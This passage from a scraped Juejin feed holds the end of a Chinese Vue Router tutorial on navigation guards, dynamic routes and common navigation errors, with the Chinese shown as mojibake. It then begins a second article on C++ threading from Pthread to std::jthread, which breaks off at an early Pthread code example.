<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">loadDynamicRoutes</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">if</span> (dynamicRoutesLoaded) <span class="hljs-keyword">return</span>
  
  <span class="hljs-keyword">try</span> {
    <span class="hljs-keyword">const</span> userInfo = <span class="hljs-keyword">await</span> authStore.<span class="hljs-title function_">getUserInfo</span>()
    <span class="hljs-keyword">const</span> menus = <span class="hljs-keyword">await</span> menuStore.<span class="hljs-title function_">fetchUserMenus</span>(userInfo.<span class="hljs-property">role</span>)
    
    <span class="hljs-comment">// è½¬æ¢èœå•ä¸ºè·¯ç”±</span>
    <span class="hljs-keyword">const</span> routes = <span class="hljs-title function_">transformMenusToRoutes</span>(menus)
    
    <span class="hljs-comment">// åŠ¨æ€æ·»åŠ è·¯ç”±</span>
    routes.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">route</span> =&gt;</span> {
      router.<span class="hljs-title function_">addRoute</span>(<span class="hljs-string">'Layout'</span>, route)
    })
    
    dynamicRoutesLoaded = <span class="hljs-literal">true</span>
    
    <span class="hljs-comment">// å¦‚æœå½“å‰è·¯ç”±ä¸å­˜åœ¨ï¼Œé‡å®šå‘åˆ°é¦–é¡µ</span>
    <span class="hljs-keyword">if</span> (!router.<span class="hljs-title function_">hasRoute</span>(router.<span class="hljs-property">currentRoute</span>.<span class="hljs-property">value</span>.<span class="hljs-property">name</span>)) {
      router.<span class="hljs-title function_">replace</span>(<span class="hljs-string">'/'</span>)
    }
  } <span class="hljs-keyword">catch</span> (error) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'åŠ è½½åŠ¨æ€è·¯ç”±å¤±è´¥:'</span>, error)
    router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/error'</span>)
  }
}

<span class="hljs-comment">// è·¯ç”±å®ˆå«</span>
router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-keyword">async</span> (to, <span class="hljs-keyword">from</span>, next) =&gt; {
  <span class="hljs-comment">// æ˜¾ç¤ºåŠ è½½ä¸­</span>
  loadingBar.<span class="hljs-title function_">start</span>()
  
  <span class="hljs-comment">// ç™»å½•æ£€æŸ¥</span>
  <span class="hljs-keyword">if</span> (to.<span class="hljs-property">meta</span>.<span class="hljs-property">requiresAuth</span> &amp;&amp; !authStore.<span class="hljs-property">isLoggedIn</span>) {
    <span class="hljs-title function_">next</span>({
      <span class="hljs-attr">name</span>: <span class="hljs-string">'Login'</span>,
      <span class="hljs-attr">query</span>: { <span class="hljs-attr">redirect</span>: to.<span class="hljs-property">fullPath</span> }
    })
    <span class="hljs-keyword">return</span>
  }
  
  <span class="hljs-comment">// æ¸¸å®¢é¡µé¢æ£€æŸ¥ï¼ˆå·²ç™»å½•ç”¨æˆ·ä¸èƒ½è®¿é—®ç™»å½•é¡µï¼‰</span>
  <span class="hljs-keyword">if</span> (to.<span class="hljs-property">meta</span>.<span class="hljs-property">guest</span> &amp;&amp; authStore.<span class="hljs-property">isLoggedIn</span>) {
    <span class="hljs-title function_">next</span>(<span class="hljs-string">'/'</span>)
    <span class="hljs-keyword">return</span>
  }
  
  <span class="hljs-comment">// åŠ è½½åŠ¨æ€è·¯ç”±</span>
  <span class="hljs-keyword">if</span> (!dynamicRoutesLoaded &amp;&amp; authStore.<span class="hljs-property">isLoggedIn</span>) {
    <span class="hljs-keyword">await</span> <span class="hljs-title function_">loadDynamicRoutes</span>()
    <span class="hljs-comment">// åŠ¨æ€è·¯ç”±åŠ è½½åé‡æ–°è·³è½¬</span>
    <span class="hljs-title function_">next</span>(to.<span class="hljs-property">fullPath</span>)
    <span class="hljs-keyword">return</span>
  }
  
  <span class="hljs-comment">// æƒé™æ£€æŸ¥</span>
  <span class="hljs-keyword">if</span> (to.<span class="hljs-property">meta</span>.<span class="hljs-property">permissions</span>) {
    <span class="hljs-keyword">const</span> hasPermission = <span class="hljs-title function_">checkPermission</span>(to.<span class="hljs-property">meta</span>.<span class="hljs-property">permissions</span>)
    <span class="hljs-keyword">if</span> (!hasPermission) {
      <span class="hljs-title function_">next</span>(<span class="hljs-string">'/403'</span>)
      <span class="hljs-keyword">return</span>
    }
  }
  
  <span class="hljs-title function_">next</span>()
})

router.<span class="hljs-title function_">afterEach</span>(<span class="hljs-function">(<span class="hljs-params">to</span>) =&gt;</span> {
  <span class="hljs-comment">// è®¾ç½®é¡µé¢æ ‡é¢˜</span>
  <span class="hljs-variable language_">document</span>.<span class="hljs-property">title</span> = to.<span class="hljs-property">meta</span>.<span class="hljs-property">title</span> ? <span class="hljs-string">`<span class="hljs-subst">${to.meta.title}</span> - åå°ç®¡ç†`</span> : <span class="hljs-string">'åå°ç®¡ç†'</span>
  
  <span class="hljs-comment">// å…³é—­åŠ è½½</span>
  loadingBar.<span class="hljs-title function_">finish</span>()
  
  <span class="hljs-comment">// è®°å½•è®¿é—®æ—¥å¿—</span>
  <span class="hljs-title function_">logAccess</span>(to)
})
</code></pre>
<h3 data-id="heading-26">ä¹ã€å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h3>
<h4 data-id="heading-27">9.1 è·¯ç”±è·³è½¬å¸¸è§é”™è¯¯</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// é”™è¯¯1ï¼šé‡å¤è·³è½¬ç›¸åŒè·¯ç”±</span>
<span class="hljs-comment">// âŒ ä¼šæŠ¥é”™ï¼šNavigationDuplicated</span>
router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/current-path'</span>)

<span class="hljs-comment">// âœ… è§£å†³æ–¹æ¡ˆï¼šæ£€æŸ¥å½“å‰è·¯ç”±</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">safePush</span>(<span class="hljs-params">to</span>) {
  <span class="hljs-keyword">if</span> (router.<span class="hljs-property">currentRoute</span>.<span class="hljs-property">value</span>.<span class="hljs-property">path</span> !== to) {
    router.<span class="hljs-title function_">push</span>(to)
  }
}

<span class="hljs-comment">// é”™è¯¯2ï¼šparams å’Œ path åŒæ—¶ä½¿ç”¨</span>
<span class="hljs-comment">// âŒ params ä¼šè¢«å¿½ç•¥</span>
router.<span class="hljs-title function_">push</span>({
  <span class="hljs-attr">path</span>: <span class="hljs-string">'/user/123'</span>,
  <span class="hljs-attr">params</span>: { <span class="hljs-attr">id</span>: <span class="hljs-number">456</span> }  <span class="hljs-comment">// è¿™ä¸ªè¢«å¿½ç•¥ï¼</span>
})

<span class="hljs-comment">// âœ… æ­£ç¡®ï¼šä½¿ç”¨å‘½åè·¯ç”±</span>
router.<span class="hljs-title function_">push</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-string">'User'</span>,
  <span class="hljs-attr">params</span>: { <span class="hljs-attr">id</span>: <span class="hljs-number">456</span> }
})

<span class="hljs-comment">// é”™è¯¯3ï¼šè·¯ç”±æœªæ‰¾åˆ°</span>
<span class="hljs-comment">// âŒ è·³è½¬åˆ°ä¸å­˜åœ¨çš„è·¯ç”±</span>
router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/non-existent'</span>)

<span class="hljs-comment">// âœ… è§£å†³æ–¹æ¡ˆï¼šæ£€æŸ¥è·¯ç”±æ˜¯å¦å­˜åœ¨</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">safeNavigate</span>(<span class="hljs-params">to</span>) {
  <span class="hljs-keyword">const</span> resolved = router.<span class="hljs-title function_">resolve</span>(to)
  <span class="hljs-keyword">if</span> (resolved.<span class="hljs-property">matched</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
    router.<span class="hljs-title function_">push</span>(to)
  } <span class="hljs-keyword">else</span> {
    router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/404'</span>)
  }
}

<span class="hljs-comment">// é”™è¯¯4ï¼šç»„ä»¶æœªåŠ è½½</span>
<span class="hljs-comment">// âŒ å¼‚æ­¥ç»„ä»¶åŠ è½½å¤±è´¥</span>
router.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'AsyncComponent'</span> })

<span class="hljs-comment">// âœ… è§£å†³æ–¹æ¡ˆï¼šæ·»åŠ é”™è¯¯å¤„ç†</span>
router.<span class="hljs-title function_">push</span>({ <span class="hljs-attr">name</span>: <span class="hljs-string">'AsyncComponent'</span> }).<span class="hljs-keyword">catch</span>(<span class="hljs-function"><span class="hljs-params">error</span> =&gt;</span> {
  <span class="hljs-keyword">if</span> (error.<span class="hljs-property">name</span> === <span class="hljs-string">'NavigationDuplicated'</span>) {
    <span class="hljs-comment">// å¿½ç•¥é‡å¤å¯¼èˆªé”™è¯¯</span>
    <span class="hljs-keyword">return</span>
  }
  
  <span class="hljs-comment">// å…¶ä»–é”™è¯¯å¤„ç†</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'å¯¼èˆªå¤±è´¥:'</span>, error)
  router.<span class="hljs-title function_">push</span>(<span class="hljs-string">'/error'</span>)
})
</code></pre>
<h4 data-id="heading-28">9.2 æ€§èƒ½ä¼˜åŒ–å»ºè®®</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. è·¯ç”±æ‡’åŠ è½½</span>
<span class="hljs-keyword">const</span> routes = [
  {
    <span class="hljs-attr">path</span>: <span class="hljs-string">'/heavy-page'</span>,
    <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-keyword">import</span>(<span class="hljs-comment">/* webpackChunkName: "heavy" */</span> <span class="hljs-string">'@/views/HeavyPage.vue'</span>)
  }
]

<span class="hljs-comment">// 2. ç»„ä»¶é¢„åŠ è½½</span>
<span class="hljs-comment">// åœ¨é€‚å½“çš„æ—¶å€™é¢„åŠ è½½è·¯ç”±ç»„ä»¶</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">prefetchRoute</span>(<span class="hljs-params">routeName</span>) {
  <span class="hljs-keyword">const</span> route = router.<span class="hljs-title function_">getRoutes</span>().<span class="hljs-title function_">find</span>(<span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> r.<span class="hljs-property">name</span> === routeName)
  <span class="hljs-keyword">if</span> (route &amp;&amp; <span class="hljs-keyword">typeof</span> route.<span class="hljs-property">components</span>?.<span class="hljs-property">default</span> === <span class="hljs-string">'function'</span>) {
    route.<span class="hljs-property">components</span>.<span class="hljs-title function_">default</span>()
  }
}

<span class="hljs-comment">// åœ¨é¼ æ ‡æ‚¬åœæ—¶é¢„åŠ è½½</span>
&lt;router-link 
  :to=<span class="hljs-string">"{ name: 'HeavyPage' }"</span>
  @mouseenter=<span class="hljs-string">"prefetchRoute('HeavyPage')"</span>
&gt;
  é‡é‡çº§é¡µé¢
&lt;/router-link&gt;

<span class="hljs-comment">// 3. è·¯ç”±ç¼“å­˜</span>
<span class="hljs-comment">// ä½¿ç”¨ keep-alive ç¼“å­˜å¸¸ç”¨é¡µé¢</span>
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">router-view</span> <span class="hljs-attr">v-slot</span>=<span class="hljs-string">"{ Component, route }"</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">keep-alive</span> <span class="hljs-attr">:include</span>=<span class="hljs-string">"cachedRoutes"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">component</span> <span class="hljs-attr">:is</span>=<span class="hljs-string">"Component"</span> <span class="hljs-attr">:key</span>=<span class="hljs-string">"route.fullPath"</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">keep-alive</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">router-view</span>&gt;</span></span>

<span class="hljs-comment">// 4. æ»šåŠ¨ä½ç½®ç¼“å­˜</span>
<span class="hljs-keyword">const</span> scrollPositions = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Map</span>()

router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span></span>) =&gt;</span> {
  <span class="hljs-comment">// ä¿å­˜ç¦»å¼€æ—¶çš„æ»šåŠ¨ä½ç½®</span>
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">from</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">keepScroll</span>) {
    scrollPositions.<span class="hljs-title function_">set</span>(<span class="hljs-keyword">from</span>.<span class="hljs-property">fullPath</span>, {
      <span class="hljs-attr">x</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">scrollX</span>,
      <span class="hljs-attr">y</span>: <span class="hljs-variable language_">window</span>.<span class="hljs-property">scrollY</span>
    })
  }
})

router.<span class="hljs-title function_">afterEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span></span>) =&gt;</span> {
  <span class="hljs-comment">// æ¢å¤æ»šåŠ¨ä½ç½®</span>
  <span class="hljs-keyword">if</span> (to.<span class="hljs-property">meta</span>.<span class="hljs-property">keepScroll</span> &amp;&amp; <span class="hljs-keyword">from</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">keepScroll</span>) {
    <span class="hljs-keyword">const</span> position = scrollPositions.<span class="hljs-title function_">get</span>(to.<span class="hljs-property">fullPath</span>)
    <span class="hljs-keyword">if</span> (position) {
      <span class="hljs-variable language_">window</span>.<span class="hljs-title function_">scrollTo</span>(position.<span class="hljs-property">x</span>, position.<span class="hljs-property">y</span>)
    }
  }
})
</code></pre>
<h3 data-id="heading-29">åã€æ€»ç»“</h3>
<h4 data-id="heading-30">è·¯ç”±è·³è½¬é€‰æ‹©æŒ‡å—</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// æ ¹æ®åœºæ™¯é€‰æ‹©è·³è½¬æ–¹å¼</span>
<span class="hljs-keyword">const</span> navigationGuide = {
  <span class="hljs-comment">// åœºæ™¯ï¼šæ™®é€šé“¾æ¥</span>
  æ™®é€šé“¾æ¥: <span class="hljs-string">'ä½¿ç”¨ &lt;router-link&gt;'</span>,
  
  <span class="hljs-comment">// åœºæ™¯ï¼šæŒ‰é’®ç‚¹å‡»è·³è½¬</span>
  æŒ‰é’®ç‚¹å‡»: <span class="hljs-string">'ä½¿ç”¨ router.push()'</span>,
  
  <span class="hljs-comment">// åœºæ™¯ï¼šè¡¨å•æäº¤å</span>
  è¡¨å•æäº¤: <span class="hljs-string">'ä½¿ç”¨ router.replace() é¿å…é‡å¤æäº¤'</span>,
  
  <span class="hljs-comment">// åœºæ™¯ï¼šè¿”å›ä¸Šä¸€æ­¥</span>
  è¿”å›æ“ä½œ: <span class="hljs-string">'ä½¿ç”¨ router.back() æˆ– router.go(-1)'</span>,
  
  <span class="hljs-comment">// åœºæ™¯ï¼šæƒé™éªŒè¯åè·³è½¬</span>
  æƒé™è·³è½¬: <span class="hljs-string">'åœ¨å¯¼èˆªå®ˆå«ä¸­æ§åˆ¶'</span>,
  
  <span class="hljs-comment">// åœºæ™¯ï¼šåŠ¨æ€è·¯ç”±</span>
  åŠ¨æ€è·¯ç”±: <span class="hljs-string">'ä½¿ç”¨ router.addRoute() åŠ¨æ€æ·»åŠ '</span>,
  
  <span class="hljs-comment">// åœºæ™¯ï¼š404å¤„ç†</span>
  æœªæ‰¾åˆ°é¡µé¢: <span class="hljs-string">'é…ç½® catch-all è·¯ç”±'</span>,
  
  <span class="hljs-comment">// åœºæ™¯ï¼šå¹³æ»‘è¿‡æ¸¡</span>
  é¡µé¢è¿‡æ¸¡: <span class="hljs-string">'ä½¿ç”¨ &lt;transition&gt; åŒ…è£¹ &lt;router-view&gt;'</span>
}

<span class="hljs-comment">// æœ€ä½³å®è·µæ€»ç»“</span>
<span class="hljs-keyword">const</span> bestPractices = <span class="hljs-string">`
1. å°½é‡ä½¿ç”¨å‘½åè·¯ç”±ï¼Œæé«˜ä»£ç å¯ç»´æŠ¤æ€§
2. å¤æ‚å‚æ•°ä¼ é€’ä½¿ç”¨ props è€Œä¸æ˜¯ç›´æ¥æ“ä½œ $route
3. é‡è¦è·³è½¬æ·»åŠ  loading çŠ¶æ€å’Œé”™è¯¯å¤„ç†
4. åˆç†ä½¿ç”¨å¯¼èˆªå®ˆå«è¿›è¡Œæƒé™æ§åˆ¶
5. ç§»åŠ¨ç«¯è€ƒè™‘æ»‘åŠ¨è¿”å›ç­‰äº¤äº’
6. SEO é‡è¦é¡µé¢ä½¿ç”¨é™æ€è·¯å¾„
7. é€‚å½“ä½¿ç”¨è·¯ç”±ç¼“å­˜æå‡æ€§èƒ½
8. ç›‘æ§è·¯ç”±è·³è½¬é”™è¯¯å’Œå¼‚å¸¸
`</span>
</code></pre>
<p>Vue Router æä¾›äº†å¼ºå¤§è€Œçµæ´»çš„è·¯ç”±è·³è½¬æœºåˆ¶ï¼ŒæŒæ¡å„ç§è·³è½¬æ–¹å¼å¹¶æ ¹æ®åœºæ™¯åˆç†é€‰æ‹©ï¼Œå¯ä»¥æ˜¾è‘—æå‡åº”ç”¨çš„ç”¨æˆ·ä½“éªŒå’Œå¼€å‘æ•ˆç‡ã€‚è®°ä½ï¼š<strong>ç®€å•çš„ç”¨å£°æ˜å¼ï¼Œå¤æ‚çš„ç”¨ç¼–ç¨‹å¼ï¼Œå…¨å±€çš„æ§åˆ¶ç”¨å®ˆå«</strong>ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[C++çº¿ç¨‹ç¼–ç¨‹æ¨¡å‹æ¼”è¿›ï¼šä»Pthreadåˆ°jthreadçš„æŠ€æœ¯é©å‘½]]></title>    <link>https://juejin.cn/post/7595167566144585747</link>    <guid>https://juejin.cn/post/7595167566144585747</guid>    <pubDate>2026-01-15T08:57:51.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595167566144585747" data-draft-id="7595178023256309779" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="C++çº¿ç¨‹ç¼–ç¨‹æ¨¡å‹æ¼”è¿›ï¼šä»Pthreadåˆ°jthreadçš„æŠ€æœ¯é©å‘½"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2026-01-15T08:57:51.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç äº‹æ¼«è°ˆ"/> <meta itemprop="url" content="https://juejin.cn/user/1972974802965230"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            C++çº¿ç¨‹ç¼–ç¨‹æ¨¡å‹æ¼”è¿›ï¼šä»Pthreadåˆ°jthreadçš„æŠ€æœ¯é©å‘½
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç äº‹æ¼«è°ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T08:57:51.000Z" title="Thu Jan 15 2026 08:57:51 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æ–‡ç³»ç»Ÿæ€§åœ°åˆ†æäº†POSIXçº¿ç¨‹ï¼ˆPthreadï¼‰ã€C++11æ ‡å‡†çº¿ç¨‹ï¼ˆstd::threadï¼‰å’ŒC++20åä½œçº¿ç¨‹ï¼ˆstd::jthreadï¼‰çš„æŠ€æœ¯æ¼”è¿›å†ç¨‹ã€‚é€šè¿‡å¯¹æ¯”ä¸‰è€…çš„è®¾è®¡å“²å­¦ã€æ¥å£å·®å¼‚ã€èµ„æºç®¡ç†æœºåˆ¶å’Œå®‰å…¨ç‰¹æ€§ï¼Œæ­ç¤ºäº†çº¿ç¨‹ç¼–ç¨‹ä»å¹³å°ç›¸å…³å‘è¯­è¨€åŸç”Ÿã€ä»æ‰‹åŠ¨ç®¡ç†å‘è‡ªåŠ¨å®‰å…¨çš„è½¬å˜è·¯å¾„ã€‚æ–‡ç« åŸºäºISO C++æ ‡å‡†å’ŒPOSIXè§„èŒƒçš„æŠ€æœ¯äº‹å®ï¼Œä¸ºå¼€å‘è€…é€‰æ‹©é€‚å½“çš„çº¿ç¨‹æ¨¡å‹æä¾›ç†è®ºä¾æ®å’Œå®è·µæŒ‡å¯¼ã€‚</p>
<h3 data-id="heading-0">1. å¼•è¨€ï¼šçº¿ç¨‹ç¼–ç¨‹çš„æ ‡å‡†åŒ–ä¹‹è·¯</h3>
<p>çº¿ç¨‹ä½œä¸ºç°ä»£å¹¶å‘è®¡ç®—çš„åŸºç¡€æŠ½è±¡ï¼Œå…¶ç¼–ç¨‹æ¨¡å‹ç»å†äº†ä»æ“ä½œç³»ç»Ÿç‰¹å®šæ¥å£åˆ°ç¼–ç¨‹è¯­è¨€åŸç”Ÿæ”¯æŒçš„æ¼”è¿›ã€‚1995å¹´IEEE Std 1003.1cï¼ˆPOSIX.1cï¼‰é¦–æ¬¡æ ‡å‡†åŒ–äº†Pthread APIï¼Œä¸ºUnix-likeç³»ç»Ÿæä¾›äº†ç»Ÿä¸€çš„çº¿ç¨‹æ¥å£ã€‚2011å¹´ISO C++11æ ‡å‡†å¼•å…¥std::threadï¼Œæ ‡å¿—ç€çº¿ç¨‹æ”¯æŒæ­£å¼æˆä¸ºC++è¯­è¨€çš„ä¸€éƒ¨åˆ†ã€‚2020å¹´C++20æ ‡å‡†æ¨å‡ºstd::jthreadï¼Œè§£å†³äº†std::threadç”Ÿå‘½å‘¨æœŸç®¡ç†çš„æ ¸å¿ƒç¼ºé™·ï¼Œå¹¶å¼•å…¥äº†åä½œå¼ä¸­æ–­æœºåˆ¶ã€‚</p>
<p>è¿™ä¸€æ¼”è¿›åæ˜ äº†è½¯ä»¶å·¥ç¨‹ä»"æ‰‹åŠ¨ç®¡ç†èµ„æº"åˆ°"èµ„æºå®‰å…¨è‡ªåŠ¨åŒ–"çš„æ ¸å¿ƒç†å¿µè½¬å˜ï¼Œä¸‹æ–‡å°†è¯¦ç»†è§£æå„é˜¶æ®µçš„æŠ€æœ¯å®ç°åŠå…¶è®¾è®¡æƒè¡¡ã€‚</p>
<h3 data-id="heading-1">2. Pthreadï¼šè·¨å¹³å°çº¿ç¨‹çš„åŸºçŸ³</h3>
<h4 data-id="heading-2">2.1 è®¾è®¡å“²å­¦ä¸æ¥å£ç‰¹æ€§</h4>
<p>PthreadåŸºäºCè¯­è¨€è¿‡ç¨‹å¼è®¾è®¡ï¼Œæä¾›çº¦100ä¸ªå‡½æ•°ç»„æˆçš„APIé›†ï¼Œæ¶µç›–çº¿ç¨‹ç®¡ç†ã€åŒæ­¥åŸè¯­ã€æ¡ä»¶å˜é‡å’Œç‰¹å®šäºçº¿ç¨‹çš„æ•°æ®æ“ä½œã€‚å…¶æ ¸å¿ƒè®¾è®¡åŸåˆ™æ˜¯<strong>æœ€å¤§çµæ´»æ€§å’Œæœ€å°æŠ½è±¡</strong>ï¼Œå°†çº¿ç¨‹è§†ä¸ºå¯ç”±ç¨‹åºå‘˜å®Œå…¨æ§åˆ¶çš„ç³»ç»Ÿèµ„æºã€‚</p>
<pre><code class="hljs language-c" lang="c"><span class="hljs-comment">// å…¸å‹çš„Pthreadåˆ›å»ºæ¨¡å¼</span>
<span class="hljs-type">pthread_t</span> thread;
<span class="hljs-type">pthread_attr_t</span> attr;
pthread_attr_init(&amp;attr);
pthread_attr_setdetachstate(&amp;attr, PTHREAD_CREATE_JOINABLE);

<span class="hljs-type">int</span> result = pthread_create(&amp;thread, &amp;attr, worker_function, argument);
<span class="hljs-keyword">if</span> (result != <span class="hljs-number">0</span>) {
